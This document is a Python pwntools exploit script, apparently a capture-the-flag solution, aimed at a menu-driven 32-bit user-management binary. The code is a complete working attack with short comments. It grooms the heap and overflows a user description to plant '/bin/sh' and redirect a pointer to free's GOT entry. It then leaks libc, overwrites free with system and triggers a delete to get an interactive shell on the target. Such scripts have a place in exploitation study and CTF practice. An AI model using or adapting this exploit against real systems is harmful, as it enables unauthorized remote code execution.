from pwn import remote, PwnlibException, p32, u32
import sys

FREE_GOT = 0x804b010
FREE_GOT_OFFSET = 0x71470

SYSTEM_LIBC_OFFSET = 0x3ada0

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print "Usage: {} <host> <port>".format(sys.argv[0])
        exit()

    HOST = sys.argv[1]
    PORT = sys.argv[2]

    try:
        con = remote(HOST, PORT)
    except PwnlibException:
        print "Can't connect to host"
        exit()

    # add user 1
    con.sendline("0")
    con.sendline("4")
    con.sendline("AAAA")
    con.sendline("4")
    con.sendline("AAAA")

    # add user 2
    con.sendline("0")
    con.sendline("4")
    con.sendline("BBBB")
    con.sendline("4")
    con.sendline("BBBB")

    # delete user 1
    con.sendline("1")
    con.sendline("0")

    # add user 3
    con.sendline("0")
    con.sendline("24")
    con.sendline("CCCC")
    con.sendline("4")
    con.sendline("CCCC")

    # edit user 3
    # create the string /bin/sh for later use and overwrite the user 3 pointer to free got
    con.sendline("3")
    con.sendline("2")
    con.sendline("156")
    con.sendline("/bin/sh\x00" + "D" * 144 + p32(FREE_GOT))

    # display user 2
    # displaying the user to leak the address of free, and then calculate the libc base (its changing every run)
    con.sendline("2")
    con.sendline("1")

    con.recvuntil("description:")
    con.recvuntil("description:")
    con.recvuntil("description:")
    con.recvuntil("description:")

    leak = u32(con.recvuntil("0:")[1:5])
    libc_base = leak - FREE_GOT_OFFSET

    print "leaked free(): 0x{:08x}".format(leak)
    print "leaked libc base: 0x{:08x}".format(libc_base)

    # change user 2
    # we acutally overwriting the GOT table entry of free to system, because we overwrited the pointer
    con.sendline("3")
    con.sendline("1")
    con.sendline("4")
    con.sendline(p32(libc_base + SYSTEM_LIBC_OFFSET))

    # then just trigger delete, that use free, but actually calling to system with pointer to what to "free" so calling:
    # system("/bin/sh") :)
    con.sendline("1")
    con.sendline("2")

    con.interactive()
